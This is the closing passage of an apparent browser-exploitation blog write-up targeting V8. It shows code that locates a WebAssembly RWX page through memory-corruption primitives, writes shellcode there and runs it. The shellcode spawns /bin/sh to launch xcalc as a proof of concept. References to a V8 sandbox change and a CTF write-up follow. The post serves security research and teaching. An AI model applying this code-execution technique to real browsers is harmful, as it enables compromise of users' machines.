  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span>
  <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span>
  <span class=mh>0x0b</span>
<span class=p>]);</span>
<span class=kd>let</span> <span class=mi>_</span><span class=nx>module</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=mi>_</span><span class=nx>wasm</span><span class=p>);</span>
<span class=kd>let</span> <span class=mi>_</span><span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=mi>_</span><span class=nx>module</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>rwx</span> <span class=o>=</span> <span class=nx>weak_read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=mi>_</span><span class=nx>instance</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>);</span> 

<span class=kd>let</span> <span class=nx>shellcode</span> <span class=o>=</span> <span class=p>[</span>
  <span class=mh>0x732f6e69622fb848</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x66525f5450990068</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x15e8525e54632d68</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x4c50534944000000</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x302e303a273d5941</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x00636c6163782027</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x0f583b6a5e545756</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x0000000000000005</span><span class=nx>n</span>
<span class=p>];</span>
<span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>shellcode</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
  <span class=nx>strong_write</span><span class=p>(</span><span class=nx>rwx</span> <span class=o>+</span> <span class=p>(</span><span class=mi>8</span><span class=nx>n</span> <span class=o>*</span> <span class=nx>BigInt</span><span class=p>(</span><span class=nx>i</span><span class=p>)),</span> <span class=nx>shellcode</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>

<span class=mi>_</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>main</span><span class=p>();</span>
</code></pre></div><h2 id=references>References</h2>
<ul>
<li><a href=https://chromium-review.googlesource.com/c/v8/v8/+/3845636>[sandbox] Remove a number of native allocations from WasmInstanceObject</a></li>
<li><a href=https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/>DiceCTF 2022 - Memory Hole | kylebot&rsquo;s Blog</a></li>
<li><a href=https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global>WebAssembly.Global() constructor - WebAssembly | MDN</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<p>&copy; 2023 Anvbis</p>
<p>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p>
</footer>
</div>
</body>
</html>